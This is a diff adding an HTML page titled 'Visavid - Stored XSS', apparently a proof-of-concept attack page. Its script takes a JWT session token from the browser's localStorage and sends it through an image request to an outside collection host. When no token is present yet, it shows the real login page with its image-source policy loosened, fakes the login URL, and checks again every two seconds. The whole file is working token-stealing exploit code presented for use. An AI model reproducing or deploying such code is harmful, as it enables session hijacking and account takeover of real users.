@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<meta charset="UTF-8">
+<title>Visavid - Stored XSS</title>
+<style>
+</style>
+<body>    
+    <div>
+        Please wait while you are redirected....
+    </div>
+    <script>
+        const EX_URL = "https://visavid.netlog-py.ml/token?v=";        
+        var success = false;
+
+        function exfiltrateToken(token) {
+            console.log("JWT token: " + token);
+            
+            var b = document.getElementsByTagName("body")[0];
+            var img = document.createElement("img");
+            img.src = EX_URL + btoa(token)
+            b.appendChild(img);
+
+        }
+        function steal() {
+
+            if(!success) {
+                var token = localStorage.getItem("_id_token");
+                if( token) {                
+                    exfiltrateToken(token);
+                    success = true;
+                    
+                }                
+            }
+            return success;
+        }        
+
+        if( !steal()) {
+
+            console.log("Loading login page, because steal failed.");
+            var xhttp = new XMLHttpRequest();
+            xhttp.onreadystatechange = function() {
+                if (this.readyState == 4 && this.status == 200) {
+                    window.history.pushState({"html":"","pageTitle":"Login"},"", "/app/login");
+                    document.open("text/html");
+                    var html = this.responseText.replace("img-src 'self' blob: data: cdn.visavid.de visavid.de", "img-src *");
+                    document.write(html);                
+                    document.close();
+                }
+            };
+            xhttp.open("GET", "/app", true);
+            xhttp.send();                        
+            
+            console.log("Setup steal callback");
+            setInterval(steal, 2000);
+        }
+        
+    </script>
+</body>
+</html>
